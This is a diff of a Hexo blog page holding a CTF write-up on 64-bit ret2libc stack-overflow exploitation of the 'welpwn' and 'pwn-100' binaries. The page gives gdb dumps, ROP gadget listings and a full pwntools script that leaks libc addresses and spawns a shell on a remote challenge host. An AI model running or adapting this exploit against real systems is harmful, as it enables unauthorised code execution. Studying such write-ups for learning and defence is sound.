@@ -23,7 +23,7 @@
     <script id="hexo-configurations">
     let KEEP = window.KEEP || {};
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/img/aliwangwang.svg","favicon":"/img/wang.svg","article_img_align":"center","left_side_width":"300px","content_max_width":"1200px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/img/aliwangwang.svg","favicon":"/img/wang.svg","article_img_align":"center","left_side_width":"300px","content_max_width":"1200px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
   </script>
 <meta name="generator" content="Hexo 5.4.0"></head>
@@ -183,7 +183,9 @@
                     <div class="meta-info">
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2020-08-07 21:22:24
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2020-08-07 21:22:24</span>
+        <span class="mobile">2020-08-07 21:22</span>
     </span>
     
         <span class="article-categories article-meta-item">
@@ -287,7 +289,7 @@
 <p>It contains <code>puts</code>, <code>write</code>, <code>read</code> and some other functions, so we can use <code>puts</code> or <code>write</code> to output <code>read</code> address, then find out the <code>libc</code> version, calculate <code>libc</code> base address, and finally execute <code>system(&quot;/bin/sh&quot;)</code>.</p>
 <p>First determine the offset of overflow. Input <code>aaaaaaaa</code> and step to the end of <code>echo()</code>, check the stack in <code>gdb</code>.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/20x 0x00007fffffffde40</span><br><span class="line">0x7fffffffde40: 0xf7fbe4a0      0x00007fff      0xffffde70      0x00007fff</span><br><span class="line">0x7fffffffde50: 0x61616161      0x61616161      0xf7fc390a      0x00007fff</span><br><span class="line">0x7fffffffde60: 0xffffe270      0x00007fff      0x0040082d      0x00000000</span><br><span class="line">0x7fffffffde70: 0x61616161      0x61616161      0xf7fc390a      0x00007fff</span><br><span class="line">0x7fffffffde80: 0xf7ffd9e8      0x00007fff      0xf7ffe4f0      0x00007fff</span><br></pre></td></tr></table></figure>
-<p>The <code>aaaaaaaa</code> starts from <code>0x7fffffffde50</code> is <code>s2</code> (copied from <code>buf</code>) in <code>echo()</code>, and the <code>aaaaaaaa</code> starts from <code>0x7fffffffde70</code> is the original <code>buf</code> from <code>main()</code>. The distance is <code>0x20</code>.<br>The memory layout is like this:<br><img src="/imghost/apcaw/r2l1.png" alt="before"><br>As this is a 64-bit program, every unit/item is 8-bit length, so to overflow <code>ret addr</code> of <code>echo()</code>, padding is <code>0x18</code>. But it stops to copy when meeting <code>\x00</code>, so padding cannot be address (normally like <code>0x00abcdef</code>).<br>Payload: ‘a’ * 0x18 + pop_4 + ROPchain<br><img src="/imghost/apcaw/r2l2.png" alt="after"><br>The so called pop_4 is to pop 4 items on the stack, which is a clever method, so that program returns to ROPchain successfully. Use <code>ROPgadget</code> to find:</p>
+<p>The <code>aaaaaaaa</code> starts from <code>0x7fffffffde50</code> is <code>s2</code> (copied from <code>buf</code>) in <code>echo()</code>, and the <code>aaaaaaaa</code> starts from <code>0x7fffffffde70</code> is the original <code>buf</code> from <code>main()</code>. The distance is <code>0x20</code>.<br>The memory layout is like this:<br><img src="/imghost/apcaw/r2l1.png" alt="before"><br>As this is a 64-bit program, every unit&#x2F;item is 8-bit length, so to overflow <code>ret addr</code> of <code>echo()</code>, padding is <code>0x18</code>. But it stops to copy when meeting <code>\x00</code>, so padding cannot be address (normally like <code>0x00abcdef</code>).<br>Payload: ‘a’ * 0x18 + pop_4 + ROPchain<br><img src="/imghost/apcaw/r2l2.png" alt="after"><br>The so called pop_4 is to pop 4 items on the stack, which is a clever method, so that program returns to ROPchain successfully. Use <code>ROPgadget</code> to find:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary ./welpwn --only &quot;pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040089e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008a0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008a2 : pop r15 ; ret</span><br><span class="line">0x000000000040089b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040089f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400675 : pop rbp ; ret</span><br><span class="line">0x00000000004008a3 : pop rdi ; ret</span><br><span class="line">0x00000000004008a1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040089d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400589 : ret</span><br><span class="line">0x00000000004006a5 : ret 0xc148</span><br><span class="line">0x000000000040081a : ret 0xfffd</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 13</span><br></pre></td></tr></table></figure>
 <p>The pop_4 is in <code>0040089c</code>.<br>As for ROPchain, since 64-bit and 32-bit is different because the first few parameters are saved in registers (<code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>, <code>r8</code>, <code>r9</code>, then on the stack) in 64-bit, while stored on the stack in 32-bit.</p>
 <p>The first ROPchain should output some function address, to calculate <code>libc</code> base address and determine <code>libc</code> version. Use <code>puts</code> to output <code>read</code> address and return to <code>main</code>.<br>The first ROPchain: p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main_addr)</p>
@@ -309,7 +311,7 @@
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_40063D</span><span class="params">(__int64 a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)((<span class="keyword">signed</span> <span class="keyword">int</span>)i + a1), <span class="number">1uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h3 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h3><p>The main logic is to read 200 bytes one by one, and store them in a <code>0x40</code> length array, which leads to an overflow.</p>
 <p>There is no <code>system</code> or <code>/bin/sh</code> again, but it has <code>puts</code> and <code>read</code> functions, which helps to perform <code>ret2libc</code>.</p>
-<p><code>pwn-100</code> is pretty similar to <code>welpwn</code>, but the input part of the exploit script is really different. Here it reads 200 bytes/chars and your <code>\n</code> counts, so be careful to use <code>sendline</code> in <code>pwntools</code> (use <code>send</code> instead, I wasted hours watching my script encountering <code>EOF</code>). </p>
+<p><code>pwn-100</code> is pretty similar to <code>welpwn</code>, but the input part of the exploit script is really different. Here it reads 200 bytes&#x2F;chars and your <code>\n</code> counts, so be careful to use <code>sendline</code> in <code>pwntools</code> (use <code>send</code> instead, I wasted hours watching my script encountering <code>EOF</code>). </p>
 <h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><p>LibcSearcher method always seemed simple:</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn100&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">47390</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn100&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0400763</span></span><br><span class="line">main_addr = <span class="number">0x40068e</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> sh.recvuntil(<span class="string">&#x27;bye~\n&#x27;</span>)</span><br><span class="line">source = sh.recv()</span><br><span class="line">read_addr = u64(source[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(read_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;start libcsearcher&#x27;</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;base:&#x27;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system:&#x27;</span>+<span class="built_in">hex</span>(system_addr)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;/bin/sh:&#x27;</span>+<span class="built_in">hex</span>(bin_sh)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>In <code>welpwn</code> exploit it has <code>read_addr = u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</code>, and here <code>read_addr = u64(source[:-1].ljust(8,&#39;\x00&#39;))</code> also gives it 6 bytes. Truth is: last 7 bytes is we should focus, but the last one is <code>0xa</code> aka <code>LF</code> (line feed), so the rest consist of the output address.</p>
@@ -335,6 +337,36 @@
 
         </div>
 
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/pwn/">#pwn</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/linux/">#linux</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/stack-overflow/">#stack-overflow</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/canary/">#canary</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/ctf/">#ctf</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/rop/">#rop</a>&nbsp;
+                    </li>
+                
+            </ul>
         
 
         
@@ -390,14 +422,16 @@
         <div class="copyright-info info-item">
             &copy;
             
-              <span>2018</span>&nbsp;-&nbsp;
+              <span>2020</span>
+              -
             
             2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">TyeYeah</a>
         </div>
         
         <div class="theme-info info-item">
-            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
         </div>
+        
         
     </div>
 </footer>
@@ -407,58 +441,19 @@
 
     
         <div class="post-tools">
-            $li-border-radius = 5px;
-$li-margin-bottom = 12px;
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
 
-.post-tools-container {
-
-  .tools-list {
-
-    li {
-      cursor: pointer;
-      width: $post-tool-button-width;
-      height: $post-tool-button-width;
-      border-radius: 50%;
-      font-size: 1.2rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: $li-margin-bottom;
-      background: var(--background-color);
-      color: var(--default-text-color);
-
-      i {
-        color: var(--default-text-color);
-      }
-
-      &:hover {
-        background: var(--primary-color);
-        color: var(--background-color);
-
-        i {
-          color: var(--background-color);
-        }
-      }
-
-
-      &:last-child {
-        margin-bottom: 0;
-      }
-
-
-      hover-style(true, 1.06, 1.06);
-
-      &.page-aside-toggle {
-        display: none;
-
-        +keep-tablet() {
-          display: none !important;
-        }
-      }
-    }
-  }
-
-}
+        <!-- go comment -->
+        
+    </ul>
+</div>
 
         </div>
     
@@ -517,43 +512,9 @@ $li-margin-bottom = 12px;
         </aside>
     
 
-    .image-viewer-container {
-  position: fixed;
-  left: 0;
-  top: 0;
-  width: 100%;
-  height: 100%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  background: rgba(0, 0, 0, 0);
-  visibility: hidden;
-  z-index: $z-index-8;
-  padding: 6%;
-  box-sizing: border-box;
-  transition-t("visibility, background", "0, 0", "0.3, 0.3", "ease, ease");
-
-  &.active {
-    background: rgba(0, 0, 0, 0.5);
-    visibility: visible;
-
-    img {
-      cursor: zoom-out;
-      transform: scale(1);
-      padding: 2px;
-      background: var(--background-color);
-    }
-  }
-
-  img {
-    max-width: 100%;
-    max-height: 100%;
-    transform: scale(0);
-    transition-t("transform", "0", "0.3", "ease");
-  }
-}
-
-
+    <div class="image-viewer-container">
+    <img src="">
+</div>
 
 
     
